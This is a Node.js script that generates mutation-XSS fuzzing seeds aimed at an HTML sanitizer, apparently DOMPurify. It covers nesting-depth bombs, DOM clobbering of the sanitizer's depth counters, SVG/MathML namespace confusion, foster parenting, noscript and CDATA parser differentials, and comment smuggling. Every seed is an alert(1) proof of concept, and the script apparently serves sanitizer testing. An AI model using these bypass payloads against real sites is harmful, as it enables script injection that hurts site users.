#!/usr/bin/env node
/**
 * Generate deep nesting and browser-differential mXSS seeds.
 *
 * Categories:
 *   1. Pure depth bombs (506, 510, 512, 513 levels)
 *   2. DOM clobbering depth reset (<input name="parentNode">)
 *   3. Namespace transition at depth boundary
 *   4. Elevator mutation (<image> in SVG)
 *   5. Foster parenting (table + namespace)
 *   6. noscript scripting-flag differential
 *   7. XHTML/XML mode seeds (CDATA, PI)
 *   8. Comment smuggling in foreign content
 */

const fs = require("fs");
const path = require("path");

const outDir = path.join(__dirname, "mxss_seeds");

let seedIdx = 300;

function write(name, content) {
  const filename = `${seedIdx}_${name}.html`;
  fs.writeFileSync(path.join(outDir, filename), content);
  console.log(`  ${filename} (${content.length} bytes)`);
  seedIdx++;
}

// ── 1. Pure depth bombs ──
console.log("Category 1: Pure depth bombs");
for (const depth of [506, 510, 512, 513]) {
  const payload = "<div>".repeat(depth) +
    '<table><caption><svg><title><table><caption></caption></table></title>' +
    '<style><a id="</style><img src=x onerror=alert(1)>"></a></style>' +
    "</svg></caption></table>" +
    "</div>".repeat(depth);
  write(`depth_bomb_${depth}`, payload);
}

// Depth bomb with different wrapper elements
for (const [depth, wrapper] of [[512, "span"], [512, "b"], [510, "i"]]) {
  const payload = `<${wrapper}>`.repeat(depth) +
    '<svg><style><img src=x onerror=alert(1)></style></svg>' +
    `</${wrapper}>`.repeat(depth);
  write(`depth_bomb_${depth}_${wrapper}`, payload);
}

// ── 2. DOM clobbering depth reset ──
console.log("Category 2: DOM clobbering depth reset");
// Clobber parentNode every 200 levels to reset DOMPurify's __depth counter
for (const interval of [200, 250, 255]) {
  const cycles = Math.ceil(512 / interval);
  let payload = "";
  for (let c = 0; c < cycles; c++) {
    payload += "<form>".repeat(interval);
    payload += '<input name="parentNode">';
  }
  payload += '<svg><style><img src=x onerror=alert(1)></style></svg>';
  payload += "</form>".repeat(interval * cycles);
  write(`clobber_depth_${interval}`, payload);
}

// Clobber __removalCount
const clobberRemoval = "<div>".repeat(300) +
  '<form><input name="__removalCount"><input name="parentNode">' +
  "<div>".repeat(220) +
  '<svg><style><img src=x onerror=alert(1)></style></svg>' +
  "</div>".repeat(220) + "</form>" + "</div>".repeat(300);
write("clobber_removal_count", clobberRemoval);

// ── 3. Namespace transition at depth boundary ──
console.log("Category 3: Namespace at depth boundary");
for (const depth of [500, 508, 512]) {
  // math + mtext at depth boundary
  const p1 = "<div>".repeat(depth) +
    '<math><mtext><svg><style><img src=x onerror=alert(1)></style></svg></mtext></math>' +
    "</div>".repeat(depth);
  write(`ns_depth_math_${depth}`, p1);

  // svg + foreignObject at depth boundary
  const p2 = "<div>".repeat(depth) +
    '<svg><foreignObject><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></foreignObject></svg>' +
    "</div>".repeat(depth);
  write(`ns_depth_svg_fo_${depth}`, p2);
}

// annotation-xml at depth boundary
const annoDepth = "<div>".repeat(510) +
  '<math><annotation-xml encoding="text/html"><svg><style><img src=x onerror=alert(1)></style></svg></annotation-xml></math>' +
  "</div>".repeat(510);
write("ns_depth_annotation_510", annoDepth);

// ── 4. Elevator mutation ──
console.log("Category 4: Elevator mutation");
// <image> is renamed to <img> by browsers but not by JSDOM
const elevators = [
  '<svg><image href="x" onerror="alert(1)"></svg>',
  '<math><mtext><svg><image href="x" onerror="alert(1)"></svg></mtext></math>',
  '<svg><desc><image href="x" onerror="alert(1)"></desc></svg>',
  '<svg><title><image href="x" onerror="alert(1)"></title></svg>',
  // Elevator with stack-popping elements
  '<svg><p><image href="x" onerror="alert(1)">',
  '<math><mtext><li><image href="x" onerror="alert(1)">',
  '<svg><foreignObject><p><image href="x" onerror="alert(1)"></p></foreignObject></svg>',
  // image inside different SVG containers
  '<svg><a><image href="x" onerror="alert(1)"></a></svg>',
  '<svg><g><image href="x" onerror="alert(1)"></g></svg>',
];
for (const e of elevators) {
  write("elevator", e);
}

// ── 5. Foster parenting ──
console.log("Category 5: Foster parenting");
const fosterSeeds = [
  '<table><svg><style><img src=x onerror=alert(1)></style></svg></table>',
  '<table><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></table>',
  '<table><caption><svg><style><a id="</style><img src=x onerror=alert(1)>"></a></style></svg></caption></table>',
  '<table><tr><svg><style><img src=x onerror=alert(1)></style></svg></tr></table>',
  '<table><colgroup><svg><style><img src=x onerror=alert(1)></style></svg></colgroup></table>',
  // Nested table foster parenting
  '<table><table><svg><style><img src=x onerror=alert(1)></style></svg></table></table>',
  // Form inside table
  '<table><form><svg><style><img src=x onerror=alert(1)></style></svg></form></table>',
];
for (const f of fosterSeeds) {
  write("foster", f);
}

// ── 6. noscript scripting-flag differential ──
console.log("Category 6: noscript scripting flag");
const noscriptSeeds = [
  // Browser (JS on): noscript content is RAWTEXT. JSDOM (JS off): parsed as HTML.
  '<noscript><img src=x onerror=alert(1)></noscript>',
  '<noscript><svg onload=alert(1)></noscript>',
  '<noscript><iframe src="javascript:alert(1)"></iframe></noscript>',
  // noscript + namespace confusion
  '<svg><noscript><img src=x onerror=alert(1)></noscript></svg>',
  '<math><mtext><noscript><img src=x onerror=alert(1)></noscript></mtext></math>',
  // Double noscript
  '<noscript><noscript><img src=x onerror=alert(1)></noscript></noscript>',
  // noscript in different contexts
  '<div><noscript><style><img src=x onerror=alert(1)></style></noscript></div>',
  '<form><noscript><img src=x onerror=alert(1)></noscript></form>',
  // noscript after namespace element
  '<svg></svg><noscript><img src=x onerror=alert(1)></noscript>',
  '<math></math><noscript><script>alert(1)</script></noscript>',
];
for (const n of noscriptSeeds) {
  write("noscript", n);
}

// ── 7. XHTML/XML mode seeds ──
console.log("Category 7: XHTML/XML mode");
const xhtmlSeeds = [
  // CDATA sections (XML: data, HTML: bogus comment ending at >)
  '<![CDATA[ ><img src=x onerror=alert(1)> ]]>',
  '<svg><![CDATA[ ><img src=x onerror=alert(1)> ]]></svg>',
  '<math><![CDATA[ ><img src=x onerror=alert(1)> ]]></math>',
  // Processing Instructions (XML: PI, HTML: bogus comment)
  '<?img ><img src=x onerror=alert(1)>?>',
  '<?xml version="1.0"?><img src=x onerror=alert(1)>',
  // XHTML namespace declarations
  '<html xmlns="http://www.w3.org/1999/xhtml"><body><img src=x onerror=alert(1)></body></html>',
  // Self-closing tags (differ in HTML vs XHTML)
  '<div/><img src=x onerror=alert(1)>',
  '<svg><rect/><animate onbegin=alert(1)/></svg>',
];
for (const x of xhtmlSeeds) {
  write("xhtml", x);
}

// ── 8. Comment smuggling in foreign content ──
console.log("Category 8: Comment smuggling");
const commentSeeds = [
  // --!> is a valid comment close in HTML but not in XML/SVG
  '<svg><style><!--</style><img src=x onerror=alert(1)>--></svg>',
  '<svg><style><!-- --><img src=x onerror=alert(1)>--></style></svg>',
  '<math><mtext><style><!--</style><img src=x onerror=alert(1)>--></mtext></math>',
  // Comment inside attribute value + namespace escape
  '<svg><a><foreignObject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">',
  // Abrupt comment close
  '<svg><style><!----><img src=x onerror=alert(1)></style></svg>',
  '<svg><style><!--><img src=x onerror=alert(1)>--></style></svg>',
  // Comment in title element (SVG title vs HTML title)
  '<svg><title><!--</title><img src=x onerror=alert(1)>--></svg>',
  '<svg><desc><!--</desc><img src=x onerror=alert(1)>--></svg>',
];
for (const c of commentSeeds) {
  write("comment", c);
}

console.log(`\nGenerated ${seedIdx - 300} seeds (${300}..${seedIdx - 1})`);
